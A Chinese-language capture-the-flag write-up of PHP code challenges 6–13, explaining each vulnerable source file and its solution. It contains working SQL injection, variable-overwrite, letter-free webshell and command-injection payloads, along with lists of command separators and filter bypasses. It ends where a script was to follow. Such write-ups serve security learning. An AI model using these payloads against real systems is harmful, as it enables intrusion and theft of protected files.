<p><img src="/2020/05/12/PHP_Code_Challenge/1588687567505.png" alt="1588687567505"></p>
<h1 id="challenge6"><a href="#challenge6" class="headerlink" title="challenge6"></a>challenge6</h1><p>右键源码发现source.txt</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_POST[user] &amp;&amp; $_POST[pass]) &#123;</span><br><span class="line">	$conn = mysql_connect(<span class="string">"********"</span>, <span class="string">"*****"</span>, <span class="string">"********"</span>);</span><br><span class="line">	mysql_select_db(<span class="string">"challenges"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Could not select database"</span>);</span><br><span class="line">	<span class="keyword">if</span> ($conn-&gt;connect_error) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">"Connection failed: "</span> . mysql_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">$user = $_POST[user];</span><br><span class="line">$pass = md5($_POST[pass]);</span><br><span class="line">$sql = <span class="string">"select pwd from interest where uname='$user'"</span>;</span><br><span class="line">$query = mysql_query($sql);</span><br><span class="line"><span class="keyword">if</span> (!$query) &#123;</span><br><span class="line">	printf(<span class="string">"Error: %s\n"</span>, mysql_error($conn));</span><br><span class="line">	<span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$row = mysql_fetch_array($query, MYSQL_ASSOC);</span><br><span class="line"><span class="comment">//echo $row["pwd"];</span></span><br><span class="line">  <span class="keyword">if</span> (($row[pwd]) &amp;&amp; (!strcasecmp($pass, $row[pwd]))) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;p&gt;Logged in! Key:************** &lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"&lt;p&gt;Log in failure!&lt;/p&gt;"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>($row[pwd]) &amp;&amp; (!strcasecmp($pass, $row[pwd]))</code><br>$query中pwd列要有值<br>pwd列的值与MD5($pass)匹配<br>这里可以在username处进行实践盲注<br><img src="/2020/05/12/PHP_Code_Challenge/1588688594051.png" alt="1588688594051"></p>
<p>还可以使用联合查询注入漏洞</p>
<blockquote>
<p><code>UNION用于把来自许多SELECT语句的结果组合到一个结果集合中。 列于每个SELECT语句的对应位置的被选择的列应
具有相同的类型。（例如，被第一个语句选择的第一列应和被其它语句选择的第一列具有相同的类型。）在第一
SELECT语句中被使用的列名称也被用于结果的列名称。</code><br>其中关键是<strong>在第一个SELECT语句中被使用的列名称也被用于结果的列名称</strong><br>这意味着union后的sql语句执行结果也会被列入pwd列中<br>我们可以使union前的sql语句无结果，其后的sql语句的结果与MD5($pass)相同，使pwd列的值与MD5($pass)匹配</p>
</blockquote>
<p><img src="/2020/05/12/PHP_Code_Challenge/1588689264255.png" alt="1588689264255"></p>
<p>其中<code>c4ca4238a0b923820dcc509a6f75849b</code>为1的md5值</p>
<h1 id="challenge7"><a href="#challenge7" class="headerlink" title="challenge7"></a>challenge7</h1><p>在challenge7.txt发现源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">$_403 = <span class="string">"Access Denied"</span>;</span><br><span class="line">$_200 = <span class="string">"Welcome Admin"</span>;</span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">"REQUEST_METHOD"</span>] != <span class="string">"POST"</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"BugsBunnyCTF is here :p..."</span>);</span><br><span class="line"><span class="keyword">if</span> ( !<span class="keyword">isset</span>($_POST[<span class="string">"flag"</span>]) )</span><br><span class="line">    <span class="keyword">die</span>($_403);</span><br><span class="line"><span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $key =&gt; $value)</span><br><span class="line">    $$key = $$value;</span><br><span class="line"><span class="keyword">foreach</span> ($_POST <span class="keyword">as</span> $key =&gt; $value)</span><br><span class="line">    $$key = $value;</span><br><span class="line"><span class="keyword">if</span> ( $_POST[<span class="string">"flag"</span>] !== $flag )</span><br><span class="line">    <span class="keyword">die</span>($_403);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"This is your flag : "</span>. $flag . <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">die</span>($_200);</span><br></pre></td></tr></table></figure>

<p>有很明显的变量覆盖漏洞。要求我们在post语句中有flag，同时在第二个foreach中有把<code>$flag</code>直接覆盖了，所以直接通过echo语句输出的flag是被修改过的。接着看看有什么输出点，比如有个<code>die($_200)</code>，结合第一个foreach的功能，我们可以在第二个foreach之前先将<code>$_200</code>的值覆盖为原flag的值。payload如下：</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="section">http://IP:PORT/challenge7.php?_200=flag</span></span><br><span class="line"></span><br><span class="line"><span class="section">POST:</span></span><br><span class="line">flag=1</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/12/PHP_Code_Challenge/1589206914212.png" alt="1589206914212"></p>
<h1 id="challenge8"><a href="#challenge8" class="headerlink" title="challenge8"></a>challenge8</h1><p>源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="string">"On"</span>);</span><br><span class="line">error_reporting(E_ALL | E_STRICT);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rand_string</span><span class="params">( $length )</span> </span>&#123;</span><br><span class="line">    $chars = <span class="string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"</span>;</span><br><span class="line">    $size = strlen( $chars );</span><br><span class="line">    $str = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>( $i = <span class="number">0</span>; $i &lt; $length; $i++)</span><br><span class="line">   &#123;</span><br><span class="line">       $str .= $chars[ rand( <span class="number">0</span>, $size - <span class="number">1</span> ) ];</span><br><span class="line">   &#125;</span><br><span class="line">    <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br><span class="line">$data = $_GET[<span class="string">'c'</span>];</span><br><span class="line">$black_list = <span class="keyword">array</span>(<span class="string">' '</span>, <span class="string">'!'</span>, <span class="string">'"'</span>, <span class="string">'#'</span>, <span class="string">'%'</span>, <span class="string">'&amp;'</span>, <span class="string">'*'</span>, <span class="string">','</span>, <span class="string">'-'</span>, <span class="string">'/'</span>, <span class="string">'0'</span>, <span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'3'</span>, <span class="string">'4'</span>, <span class="string">'5'</span>, <span class="string">'6'</span>, <span class="string">'7'</span>, <span class="string">'8'</span>, <span class="string">'9'</span>, <span class="string">':'</span>, <span class="string">'&lt;'</span>, <span class="string">'&gt;'</span>, <span class="string">'?'</span>, <span class="string">'@'</span>, <span class="string">'A'</span>, <span class="string">'B'</span>, <span class="string">'C'</span>, <span class="string">'D'</span>, <span class="string">'E'</span>, <span class="string">'F'</span>, <span class="string">'G'</span>, <span class="string">'H'</span>, <span class="string">'I'</span>, <span class="string">'J'</span>, <span class="string">'K'</span>, <span class="string">'L'</span>, <span class="string">'M'</span>, <span class="string">'N'</span>, <span class="string">'O'</span>, <span class="string">'P'</span>, <span class="string">'Q'</span>, <span class="string">'R'</span>, <span class="string">'S'</span>, <span class="string">'T'</span>, <span class="string">'U'</span>, <span class="string">'V'</span>, <span class="string">'W'</span>, <span class="string">'X'</span>, <span class="string">'Y'</span>, <span class="string">'Z'</span>, <span class="string">'\\'</span>, <span class="string">'^'</span>, <span class="string">'`'</span>, <span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'e'</span>, <span class="string">'f'</span>, <span class="string">'g'</span>, <span class="string">'h'</span>, <span class="string">'i'</span>, <span class="string">'j'</span>, <span class="string">'k'</span>, <span class="string">'l'</span>, <span class="string">'m'</span>, <span class="string">'n'</span>, <span class="string">'o'</span>, <span class="string">'p'</span>, <span class="string">'q'</span>, <span class="string">'r'</span>, <span class="string">'s'</span>, <span class="string">'t'</span>, <span class="string">'u'</span>, <span class="string">'v'</span>, <span class="string">'w'</span>, <span class="string">'x'</span>, <span class="string">'y'</span>, <span class="string">'z'</span>, <span class="string">'|'</span>, <span class="string">'~'</span>);</span><br><span class="line"><span class="keyword">foreach</span> ($black_list <span class="keyword">as</span> $b) &#123;</span><br><span class="line">    <span class="keyword">if</span> (stripos($data, $b) !== <span class="keyword">false</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"WAF!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$filename=rand_string(<span class="number">0x20</span>).<span class="string">'.php'</span>;</span><br><span class="line">$folder=<span class="string">'uploads/'</span>;</span><br><span class="line">$full_filename = $folder.$filename;</span><br><span class="line"><span class="keyword">if</span>(file_put_contents($full_filename, <span class="string">'&lt;?php '</span>.$data))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;a href='"</span>.$full_filename.<span class="string">"'&gt;WebShell&lt;/a&gt;&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Enjoy your webshell~"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Some thing wrong..."</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>简单审计：<br>将c传入的字符串用白名单筛选，并且与<code>&lt;?php</code>拼接后写入uploads/xxxxx.php中<br>这道题过滤了很多，但没有过滤<code>$ _ [ ] &#39; &#39; ;</code>等，所以可以通过自增的方式构造无字母数字rce</p>
<blockquote>
<p>参考链接</p>
<ul>
<li><a href="https://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html" target="_blank" rel="noopener">https://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html</a></li>
<li><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></li>
<li><a href="https://www.freebuf.com/articles/web/186298.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/186298.html</a></li>
</ul>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_=[].[];</span><br><span class="line">$__=<span class="string">''</span>;</span><br><span class="line">$_=$_[<span class="string">''</span>];</span><br><span class="line">$_=++$_;$_=++$_;$_=++$_;$_=++$_;</span><br><span class="line">$__.=$_; <span class="comment">// E</span></span><br><span class="line">$_=++$_;$_=++$_;</span><br><span class="line">$__=$_.$__; <span class="comment">// GE</span></span><br><span class="line">$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;</span><br><span class="line">$_=++$_;$_=++$_;$_=++$_;</span><br><span class="line">$__.=$_; <span class="comment">// GET</span></span><br><span class="line">var_dump($&#123;<span class="string">'_'</span>.$__&#125;[_]($&#123;<span class="string">'_'</span>.$__&#125;[__])); <span class="comment">// $_GET['_']($_GET['__']);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$_=[].[];</span><br><span class="line">$__=<span class="string">''</span>;</span><br><span class="line">$_=$_[<span class="string">''</span>];</span><br><span class="line">$_=++$_;$_=++$_;$_=++$_;$_=++$_;</span><br><span class="line">$__.=$_;</span><br><span class="line">$_=++$_;$_=++$_;</span><br><span class="line">$__=$_.$__;</span><br><span class="line">$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;</span><br><span class="line">$_=++$_;$_=++$_;$_=++$_;</span><br><span class="line">$__.=$_;$</span><br><span class="line">&#123;<span class="string">'_'</span>.$__&#125;[_]($&#123;<span class="string">'_'</span>.$__&#125;[__]);</span><br></pre></td></tr></table></figure>

<p>将下面的那一串进行url编码后传入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%24_%3d%5b%5d.%5b%5d%3b%24__%3d%27%27%3b%24_%3d%24_%5b%27%27%5d%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24__.%3d%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24__%3d%24_.%24__%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24__.%3d%24_%3b%24%7b%27_%27.%24__%7d%5b_%5d(%24%7b%27_%27.%24__%7d%5b__%5d)%3b</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">%24%5f%3d%5b%5d%2e%5b%5d%3b%24%5f%5f%3d%27%27%3b%24%5f%3d%24%5f%5b%27%27%5d%3b%24%5f%3d%2b%2b%24%5f%3b%24%5f%3d%2b%2b%24%5f%3b%24%5f%3d%2b%2b%24%5f%3b%24%5f%3d%2b%2b%24%5f%3b%24%5f%5f%2e%3d%24%5f%3b%24%5f%3d%2b%2b%24%5f%3b%24%5f%3d%2b%2b%24%5f%3b%24%5f%5f%3d%24%5f%2e%24%5f%5f%3b%24%5f%3d%2b%2b%24%5f%3b%24%5f%3d%2b%2b%24%5f%3b%24%5f%3d%2b%2b%24%5f%3b%24%5f%3d%2b%2b%24%5f%3b%24%5f%3d%2b%2b%24%5f%3b%24%5f%3d%2b%2b%24%5f%3b%24%5f%3d%2b%2b%24%5f%3b%24%5f%3d%2b%2b%24%5f%3b%24%5f%3d%2b%2b%24%5f%3b%24%5f%3d%2b%2b%24%5f%3b%24%5f%3d%2b%2b%24%5f%3b%24%5f%3d%2b%2b%24%5f%3b%24%5f%3d%2b%2b%24%5f%3b%24%5f%5f%2e%3d%24%5f%3b%24%7b%27%5f%27%2e%24%5f%5f%7d%5b%5f%5d%28%24%7b%27%5f%27%2e%24%5f%5f%7d%5b%5f%5f%5d%29%3b</span><br></pre></td></tr></table></figure>

<p>接着访问出现的webshell，传入</p>
<blockquote>
<figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line">?<span class="symbol">_</span>=<span class="built_in">system</span>&amp;<span class="symbol">__</span>=cat%<span class="number">20</span>../flag.php</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>即<code>system(cat%20../flag.php)</code></p>
</blockquote>
<p>查看源码得到flag<br><img src="/2020/05/12/PHP_Code_Challenge/1588840767993.png" alt="1588840767993"></p>
<h1 id="challenge9"><a href="#challenge9" class="headerlink" title="challenge9"></a>challenge9</h1><p>源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[ <span class="string">'ip'</span> ])) &#123;</span><br><span class="line">    $target = trim($_REQUEST[ <span class="string">'ip'</span> ]);</span><br><span class="line">    $substitutions = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">'&amp;'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">';'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">'|'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">'-'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">'$'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">'('</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">')'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">'`'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">'||'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">    );</span><br><span class="line">    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );</span><br><span class="line">    $cmd = shell_exec( <span class="string">'ping  -c 4 '</span> . $target );</span><br><span class="line">        <span class="keyword">echo</span> $target;</span><br><span class="line">    <span class="keyword">echo</span>  <span class="string">"&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>命令执行<br>payload</p>
<blockquote>
<p>?ip=127.0.0.1%0acat%20flag.php</p>
</blockquote>
<p><img src="/2020/05/12/PHP_Code_Challenge/1588841559619.png" alt="1588841559619"></p>
<p><a href="https://blog.csdn.net/silence1_/article/details/96135760" target="_blank" rel="noopener">关于命令执行以及常见的一些绕过过滤的方法</a><br>命令分隔符</p>
<blockquote>
<p>linux中：%0a 、%0d 、; 、&amp; 、| 、&amp;&amp;、||<br>windows中：%0a、&amp;、|、%1a（一个神奇的角色，作为.bat文件中的命令分隔符）</p>
</blockquote>
<p>空格可以用以下字符串代替</p>
<blockquote>
<p>&lt; 、&lt;&gt;、%20(space)、%09(tab)、$IFS$9、 ${IFS}、$IFS等</p>
</blockquote>
<h1 id="challenge10"><a href="#challenge10" class="headerlink" title="challenge10"></a>challenge10</h1><p>源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/flag.php'</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'answer'</span>]))&#123; </span><br><span class="line">    $number = $_POST[<span class="string">'answer'</span>]; </span><br><span class="line">    <span class="keyword">if</span> (noother_says_correct($number))&#123; </span><br><span class="line">        <span class="keyword">echo</span> $flag; </span><br><span class="line">    &#125;  <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Sorry"</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">noother_says_correct</span><span class="params">($number)</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    $one = ord(<span class="string">'1'</span>); 		<span class="comment">#ord() 函数:返回字符串的首个字符的 ASCII 值</span></span><br><span class="line">    $nine = ord(<span class="string">'9'</span>); </span><br><span class="line">    <span class="comment"># Check all the input characters! </span></span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($number); $i++) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="comment"># Disallow all the digits! </span></span><br><span class="line">        $digit = ord($number&#123;$i&#125;); </span><br><span class="line">        <span class="keyword">if</span> ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) ) </span><br><span class="line">        &#123; </span><br><span class="line">            <span class="comment"># Aha, digit not allowed! </span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="comment">#要求传入的每一个值都不能大于等于1小于等于9</span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="comment"># Allow the magic number ... </span></span><br><span class="line">    <span class="keyword">return</span> $number == <span class="string">"3735929054"</span>; <span class="comment">#弱类型比较</span></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>noother_says_correct函数对POST的字符串每个字符做检测，如果有一个字符的ASCII码在[49,57]内则返回false，即输入的字符串不能含有1-9数字<br>返回true的条件是POST的字符串与<code>3735929054</code>等值比较返回true<br>发现16进制满足条件<br><img src="/2020/05/12/PHP_Code_Challenge/1588855862112.png" alt="1588855862112"></p>
<blockquote>
<p>0xdeadc0de</p>
</blockquote>
<p><img src="/2020/05/12/PHP_Code_Challenge/1588855895845.png" alt="1588855895845"></p>
<h1 id="challenge11"><a href="#challenge11" class="headerlink" title="challenge11"></a>challenge11</h1><p>源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">$a = @$_REQUEST[<span class="string">'hello'</span>];</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/^\w*$/'</span>,$a ))&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">'ERROR'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"var_dump($$a);"</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>使用了<code>&#39;/^\w*$/&#39;</code>正则匹配，即要求传入的必须为字母和数字的组合<br>var_dump($$a)中存在$$a，可以输出对应的变量值,即flag,但前提是需要知道flag的变量名，可利用$GLOBALS</p>
<p>转载自：<a href="https://www.freebuf.com/column/230907.html" target="_blank" rel="noopener">https://www.freebuf.com/column/230907.html</a></p>
<p>PHP中有一个鲜为人知的超全局变量$GLOBALS。</p>
<p>$GLOBALS定义：引用全局作用域中可用的全部变量(一个包含了全部变量的组合数组。变量的名字就是数组的键)，与所有其他超全局变量不同，$GLOBALS在PHP代码中的任何地方都是可用的，可以通过打印$GLOBALS变量查看结果验证。</p>
<p>在PHP生命周期中，定义在函数体外部的全局变量，函数内部是不能直接获得的。如果要在函数体内访问外部定义的全局变量，可以通过global声明或者直接使用$GLOBALS来进行访问。</p>
<p>比如:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$var1=<span class="string">'www.tidesec.com'</span>;</span><br><span class="line">$var2=<span class="string">'www.tidesec.net'</span>;</span><br><span class="line">test();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $var1=<span class="string">'tide'</span>;</span><br><span class="line">    <span class="keyword">echo</span> $var1,<span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line">    <span class="keyword">global</span> $var1;</span><br><span class="line">    <span class="keyword">echo</span> $var1,<span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line">    <span class="keyword">echo</span> $GLOBALS[<span class="string">'var2'</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出结果为:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tide</span><br><span class="line">www.tidesec.com</span><br><span class="line">www.tidesec.net</span><br></pre></td></tr></table></figure>

<p>其中global和$GLOBALS的区别:</p>
<p>$GLOBALS[‘var’]是外部全局变量的本身，而global $var则是外部$var的同名引用或者说是指针，也就是说global函数产生一个指向函数外部变量的别名变量，而不是真正的函数外部变量，而$GLOBALS[]确确实实调用的是外部的变量，函数内外都会始终保持一致。</p>
<p>举个例子：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$var1=tide;</span><br><span class="line">$var2=tidesec;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $GLOBALS[<span class="string">'var2'</span>]=&amp;$GLOBALS[<span class="string">'var1'</span>];</span><br><span class="line">&#125;  </span><br><span class="line">test();</span><br><span class="line"><span class="keyword">echo</span> $var2;</span><br></pre></td></tr></table></figure>

<p>结果为:</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">tide</span></span><br></pre></td></tr></table></figure>

<hr>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$var1=tide;</span><br><span class="line">$var2=tidesec;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $var1,$var2;</span><br><span class="line">    $var2=&amp;$var1;</span><br><span class="line">&#125;  </span><br><span class="line">test();</span><br><span class="line"><span class="keyword">echo</span> $var2;</span><br></pre></td></tr></table></figure>

<p>结果为：</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">tidesec</span></span><br></pre></td></tr></table></figure>

<p>结果之所以为tidesec，原因为$var1的引用指向了$var2的引用地址。导致实质的值没有发生变化。</p>
<hr>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$var1=tide;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $var1;</span><br><span class="line">    <span class="keyword">unset</span>($var1);</span><br><span class="line">&#125;  </span><br><span class="line">test();</span><br><span class="line"><span class="keyword">echo</span> $var1;</span><br></pre></td></tr></table></figure>

<p>结果为：</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">tide</span></span><br></pre></td></tr></table></figure>

<p>这就说明，删除的只是别名或者说是引用，其本身作用的值没有受到任何的影响。也就是说，global $var其实是$var = &amp;$GLOBALS[‘var’]，调用外部变量的一个别名而已</p>
<p>所以本题传入</p>
<blockquote>
<p>GLOBALS</p>
</blockquote>
<p>即可<br><img src="/2020/05/12/PHP_Code_Challenge/1588857266864.png" alt="1588857266864"></p>
<h1 id="challenge12"><a href="#challenge12" class="headerlink" title="challenge12"></a>challenge12</h1><p>源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">$a = @$_REQUEST[<span class="string">'hello'</span>];</span><br><span class="line"><span class="keyword">eval</span>( <span class="string">"var_dump($a);"</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>与challenge11思想一样<br><img src="/2020/05/12/PHP_Code_Challenge/1588857952191.png" alt="1588857952191"></p>
<p>也可以直接构造</p>
<blockquote>
<p>);var_dump(file(“flag.php”));//</p>
</blockquote>
<h1 id="challenge13"><a href="#challenge13" class="headerlink" title="challenge13"></a>challenge13</h1><p>源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">require</span>(<span class="string">'./flag.php'</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'nums'</span>]))&#123;</span><br><span class="line">  $_SESSION[<span class="string">'nums'</span>] = <span class="number">0</span>;</span><br><span class="line">  $_SESSION[<span class="string">'time'</span>] = time();</span><br><span class="line">  $_SESSION[<span class="string">'whoami'</span>] = <span class="string">'ea'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'time'</span>]+<span class="number">120</span>&lt;time())&#123;</span><br><span class="line">  session_destroy();</span><br><span class="line">&#125;				<span class="comment">#120秒后销毁会话</span></span><br><span class="line"></span><br><span class="line">$value = $_REQUEST[<span class="string">'value'</span>];</span><br><span class="line">$str_rand = range(<span class="string">'a'</span>, <span class="string">'z'</span>);	<span class="comment">#创建a-z数组</span></span><br><span class="line">$str_rands = $str_rand[mt_rand(<span class="number">0</span>,<span class="number">25</span>)].$str_rand[mt_rand(<span class="number">0</span>,<span class="number">25</span>)];<span class="comment">#生成两个随机字母</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'whoami'</span>]==($value[<span class="number">0</span>].$value[<span class="number">1</span>]) &amp;&amp; substr(md5($value),<span class="number">5</span>,<span class="number">4</span>)==<span class="number">0</span>)&#123;</span><br><span class="line">  $_SESSION[<span class="string">'nums'</span>]++;</span><br><span class="line">  $_SESSION[<span class="string">'whoami'</span>] = $str_rands;</span><br><span class="line">  <span class="keyword">echo</span> $str_rands;</span><br><span class="line">&#125;		<span class="comment">//当whoami=value时，num+1，whoami=$str_rands；==弱类型比较</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'nums'</span>]&gt;=<span class="number">10</span>)&#123;</span><br><span class="line">  <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>参数whoami要满足两个条件，一个是满足whoami输入的值与产生的随机值相等，另一个条件就是要满足md5($value)从第五位取，取四位，能够==0，其中后一个条件其实可以通过PHP的弱比较来进行利用，也就是说，只要保证第五位值为字母，就可以满足(md5($value),5,4) == 0<br>在120秒内传参十次就可以得到flag</p>
<p>脚本：</p>
